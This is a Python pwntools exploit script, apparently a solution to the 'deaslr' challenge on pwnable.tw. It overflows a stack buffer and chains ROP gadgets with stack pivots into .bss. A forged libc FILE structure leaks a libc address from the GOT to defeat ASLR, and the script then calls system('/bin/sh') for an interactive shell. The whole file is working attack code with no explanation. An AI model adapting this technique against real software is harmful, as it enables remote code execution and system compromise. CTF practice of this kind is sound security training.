from pwn import *

elf = context.binary = ELF('deaslr')
libc = elf.libc

sln = lambda data: p.sendline(data)


#p = process()
p = remote('chall.pwnable.tw', 10402) #nc chall.pwnable.tw 10402
#gdb.attach(p, '''
#           break *0x4005a0
#           break gets''')

POP_RDI = 0x4005c3 #: pop rdi ; ret
POP_RBX_RBP_R12_R13_R14_R15 = 0x4005ba
POP_RSP_R13_R14_R15 = 0x4005bd
POP_R12_R13_R14_R15 = 0x4005bc
POP_R13_R14_R15 = 0x4005be
POP_RBP = 0x4004a0 #: pop rbp ; ret
LEAVE_RET = 0x400554 
RET = 0x400555
CALL_REG = 0x4005a0
bss = 0x601010
main = 0x400536
fakefile_addr = bss
fakestack_addr = fakefile_addr + 0x100
fake_rbp = 0x6010a8
payload = b'A'*24
payload += p64(POP_RDI)
payload += p64(fakefile_addr)
payload += p64(elf.plt['gets'])
payload += p64(POP_RDI)
payload += p64(fakestack_addr)
payload += p64(elf.plt['gets'])
payload += p64(POP_RSP_R13_R14_R15)
payload += p64(fakestack_addr)
sln(payload)
fakefile = flat(
    0, # _flags
    0, # _IO_read_ptr;	
    0, # _IO_read_end;	
    0, # _IO_read_base;	
    0, # _IO_write_base;	
    0, # _IO_write_ptr;	
    0, # _IO_write_end;	
    0, # _IO_buf_base;	
    0, # _IO_buf_end;	
    0, # _IO_save_base; 
    0, # _IO_backup_base;  
    0, # _IO_save_end;
    0, # marker
    0, # *chain
    1, # fileno
    0, # _flags2
    0, # _old_offset
    0, # _cur_column
    0, # _vtable_offet
    0, # _short_buf
    0  # *lock
)
sln(fakefile)
fakestack = flat(
    0, # r13
    0, # r14
    0, # r15
    main
)
sln(fakestack)

libc_leak_addr = 0x6010c0
payload = b'A'*24
payload += p64(RET)*20 #move rsp away from next rop
payload += p64(POP_RDI)
payload += p64(libc_leak_addr - 0x8)
payload += p64(elf.plt['gets'])
payload += p64(POP_RDI)
payload += p64(libc_leak_addr + 0x20) # rsp after get libc in r12
payload += p64(elf.plt['gets'])
payload += p64(POP_RBX_RBP_R12_R13_R14_R15) # prepare rbx for call
payload += p64(0x1ffffffffffffdeb) # rbx
payload += p64(0x1ffffffffffffdec) # rbp this is to prevent loop in csu
payload += p64(0) # r12
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(0) # r15
payload += p64(POP_RDI)
payload += p64(0x601140) # rsp after leak libc
payload += p64(elf.plt['gets'])
payload += p64(POP_RSP_R13_R14_R15)
payload += p64(libc_leak_addr - 0x20)
sln(payload)


sln(p64(POP_R12_R13_R14_R15)) # move libc leak into r12

payload = flat(
    POP_R13_R14_R15,
    0x10, # r13 -> rdx size of buffer
    elf.got['gets'], # r14 -> rsi buffer
    fakefile_addr, # r15 -> rdi file structure
    CALL_REG
)
sln(payload)

payload = flat(
    POP_RDI,
    bss + 0x300, #stack pivot again after get libc
    elf.plt['gets'],
    POP_RSP_R13_R14_R15,
    bss + 0x300
)
sln(payload)

leak = p.recv(8)
leak = int.from_bytes(leak, byteorder='little')
libc.address = leak - libc.symbols['gets']
print('leak: {}'.format(hex(leak)))
print('libc: {}'.format(hex(libc.address)))


# get shell
payload = flat(
    0, #r13
    0, # r14
    0, #r15
    POP_RDI,
    next(libc.search(b'/bin/sh\x00')),
    libc.symbols['system']
)
sln(payload)

p.interactive()